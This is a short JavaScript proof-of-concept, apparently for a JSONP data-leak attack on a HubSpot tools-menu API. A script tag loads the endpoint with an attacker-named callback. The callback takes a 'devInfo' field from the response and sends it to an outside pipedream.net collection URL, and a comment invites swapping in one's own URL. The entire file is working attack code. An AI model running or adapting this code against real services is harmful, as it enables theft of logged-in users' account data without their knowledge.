window.history.replaceState(null, '', '/attacker');

function hackerHandler(e) {
	var devInfo = e.actions[4][1]
	var xhr = new XMLHttpRequest();
	xhr.open('GET', 'https://en4up0v4ttgwllq.m.pipedream.net/?devInfo='+devInfo) // change by your url
	xhr.send()
}

o = document.createElement("script");
o.type = "text/javascript";
o.referrerPolicy = "no-referrer-when-downgrade";
o.async = !0;
o.src = "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=hackerHandler";
document.getElementsByTagName("head")[0].appendChild(o)

